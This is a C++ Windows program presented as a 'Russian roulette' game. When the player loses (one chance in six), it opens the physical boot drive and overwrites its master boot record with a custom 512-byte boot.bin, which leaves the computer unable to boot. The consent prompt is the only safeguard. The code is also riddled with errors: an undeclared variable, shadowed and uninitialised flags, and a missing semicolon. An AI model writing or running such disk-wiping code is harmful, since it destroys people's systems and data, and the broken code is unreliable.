#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <iostream>
#include <Windows.h>

//i hate to put std:: before every std func so imma just use it as a namespace
using namespace std;

int main(){
  string TOS = "no"
  bool lost;
  cout << "THIS PROGRAM IS DANGEROUS PLS DONT USE IT ON YOUR MAIN OS" << endl;
  cout << "If you lose the program will write 0 to windows's MBR" << endl;
  cout << "I take no responsibility for your PC . Do you understand?" << endl;
  cout << "Type yes or no" << endl;
  cin >> TOS;
  
  // If TOS isn't accepted exit the program
  if(TOS == "no"){
    cout << "Exiting......" << endl;
    sleep(3000);
    return EXIT_FAILURE;
  }
  
  cout << "Type shoot to play" << endl;
  cin >> shooting;
  
  if(shooting == "shoot"){
    int random = rand() % 6;
      if(random == 0){
        bool lost = true;
      }else{
        cout << "you won";
        bool lost = false;
    }
  }
  
 if(lost == true){
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) { printf("Error opening a handle to the drive."); return -1; }

    HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (binary == INVALID_HANDLE_VALUE) { printf("Error opening a handle to boot.bin"); return -1; }

    DWORD size = GetFileSize(binary, 0);
    if (size != 512) { printf("Error opening a handle to boot.bin"); return -1; }

    byte* new_mbr = new byte[size];
    DWORD bytes_read;
    if(ReadFile(binary, new_mbr, size, &bytes_read, 0)) 
    {
        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
        {
            printf("First sector overritten successfuly!\n");
        }
    }else 
    {
        printf("Error reading boot.bin\n");
        printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'");
    }

    CloseHandle(binary);
    CloseHandle(drive);
    std::getchar();
    return 0;
 }
}
